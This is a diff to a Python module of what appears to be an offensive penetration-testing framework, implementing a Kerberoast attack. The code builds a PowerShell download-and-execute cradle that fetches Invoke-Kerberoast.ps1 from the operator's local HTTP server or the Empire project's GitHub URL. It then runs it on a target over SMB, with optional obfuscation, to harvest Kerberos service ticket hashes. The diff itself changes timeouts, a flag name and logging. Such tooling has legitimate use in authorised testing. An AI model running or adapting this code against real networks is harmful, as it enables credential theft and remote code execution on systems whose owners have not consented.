@@ -19,28 +19,21 @@ class InvokeKerberoast():
             if args.fileless:
                 srv_addr = get_local_ip()
                 script_location = 'http://{}/Invoke-Kerberoast.ps1'.format(srv_addr)
-                loggers['console'].warning([smb_con.host, smb_con.ip, "KERBEROAST",'Fileless execution may take up to 60 seconds for file transfer'])
-                setattr(args, 'timeout', timeout + 25)
-                '''
-                "setattr(args, 'timeout', timeout+#)" Modifies the default timeout to allow for more execution time 
-                on the system. This is required since the file transfer over HTTP can take up to 25 seconds, especially
-                when using the  "--fileless" option. All execution method classes perform a sleep(self.timeout) before
-                retrieving the cmd output, therefore this timeout modification will also delay the results in the terminal.
-                '''
+                setattr(args, 'timeout', timeout + 30)
             else:
                 script_location = 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'
-                setattr(args, 'timeout', timeout + 12)
+                setattr(args, 'timeout', timeout + 15)
             logger.debug('Script source: {}'.format(script_location))
 
             # Setup PS1 Script
             launcher = powershell.gen_ps_iex_cradle(script_location, '')
 
             # Execute
-            cmd = powershell.create_ps_command(launcher, loggers['console'], force_ps32=args.force_ps32, obfs=args.obfs, server_os=smb_con.os)
-            x = code_execution(smb_con, args, target, loggers, config_obj, cmd=cmd, return_data=True)
+            cmd = powershell.create_ps_command(launcher, loggers['console'], force_ps32=args.force_ps32, no_obfs=args.no_obfs, server_os=smb_con.os)
+            x = code_execution(smb_con, args, target, loggers, config_obj, cmd, return_data=True)
 
             # Display Output
             for line in x.splitlines():
-                loggers['console'].success([smb_con.host, smb_con.ip, "KERBEROAST", line])
+                loggers['console'].success([smb_con.host, smb_con.ip, self.name.upper(), line])
         except Exception as e:
             logger.debug("{} Error: {}".format(self.name, str(e)))
